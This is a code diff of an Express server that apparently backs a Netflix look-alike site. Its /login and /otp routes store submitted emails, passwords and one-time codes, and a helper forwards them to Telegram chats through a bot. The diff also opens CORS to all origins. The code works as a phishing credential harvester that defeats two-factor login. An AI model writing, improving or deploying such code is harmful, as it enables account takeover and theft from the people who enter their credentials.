@@ -7,67 +7,54 @@ require('dotenv').config();
 
 const app = express();
 
-// Global error trap
-process.on('uncaughtException', (err) => console.error('❌ Uncaught Exception:', err));
-process.on('unhandledRejection', (err) => console.error('❌ Unhandled Rejection:', err));
-
-// ✅ CORS: allow local dev + production host
-const allowedOrigins = [
-  'http://localhost:3000',
-  'http://localhost:5173',
-  'http://127.0.0.1:3000',
-  'http://127.0.0.1:5173',
-  'https://netflix-clone-vue-1.onrender.com',
-];
-
-app.use(
-  cors({
-    origin: function (origin, callback) {
-      if (!origin || allowedOrigins.includes(origin)) {
-        callback(null, true);
-      } else {
-        callback(new Error('CORS not allowed from: ' + origin));
-      }
-    },
-    methods: ['GET', 'POST'],
-    credentials: true,
-  })
-);
-
+// 🌐 CORS (Allow all origins)
+app.use(cors({ origin: '*' }));
 app.use(express.json());
 
-// Telegram message sender (multi-chat support)
+// 🧠 Global error traps
+process.on('uncaughtException', err => console.error('❌ Uncaught Exception:', err));
+process.on('unhandledRejection', err => console.error('❌ Unhandled Rejection:', err));
+
+// 📩 Telegram multi-chat sender
 async function sendTelegramMessage(message) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatIds = process.env.TELEGRAM_CHAT_IDS?.split(',') || [];
 
+  if (!botToken || chatIds.length === 0) {
+    return console.warn('⚠️ Missing Telegram credentials in .env');
+  }
+
   for (const chatId of chatIds) {
+    const trimmedId = chatId.trim();
+    if (!trimmedId) continue;
+
     try {
       const res = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        chat_id: chatId.trim(),
+        chat_id: trimmedId,
         text: message,
       });
-      console.log(`✅ Message sent to ${chatId.trim()}:`, res.data);
+      console.log(`✅ Message sent to ${trimmedId}:`, res.data?.result?.message_id);
     } catch (err) {
-      console.error(`❌ Telegram error for ${chatId.trim()}:`, err.response?.data || err.message);
+      const error = err.response?.data || err.message;
+      console.error(`❌ Telegram error for ${trimmedId}:`, error);
     }
   }
 }
 
-// POST /login → Save login data and remember email
+// 🔐 POST /login
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
-  if (!email || !password) return res.status(400).json({ error: 'Email and password are required' });
+  if (!email || !password)
+    return res.status(400).json({ error: 'Email and password are required' });
 
   const query = `
     SELECT id FROM submissions
-    WHERE type = 'login'
-      AND json_extract(payload, '$.email') = ?
+    WHERE type = 'login' AND json_extract(payload, '$.email') = ?
   `;
 
   db.get(query, [email], (err, existing) => {
     if (err) {
-      console.error('Login Query Error:', err);
+      console.error('❌ Login Query Error:', err);
       return res.status(500).json({ error: 'Server error' });
     }
 
@@ -83,7 +70,7 @@ app.post('/login', (req, res) => {
       ['login', payload],
       function (err) {
         if (err) {
-          console.error('Insert Login Error:', err);
+          console.error('❌ Insert Login Error:', err);
           return res.status(500).json({ error: 'Server error' });
         }
 
@@ -94,7 +81,7 @@ app.post('/login', (req, res) => {
   });
 });
 
-// POST /otp → Save OTP and send email+otp via Telegram
+// 🔐 POST /otp
 app.post('/otp', async (req, res) => {
   const { code } = req.body;
 
@@ -110,7 +97,7 @@ app.post('/otp', async (req, res) => {
     ['otp', payload],
     async function (err) {
       if (err) {
-        console.error('Insert OTP Error:', err);
+        console.error('❌ Insert OTP Error:', err);
         return res.status(500).json({ error: 'Server error' });
       }
 
@@ -122,7 +109,7 @@ app.post('/otp', async (req, res) => {
   );
 });
 
-// Start server
+// 🚀 Start server
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => {
   console.log(`✅ Server running on http://localhost:${PORT}`);
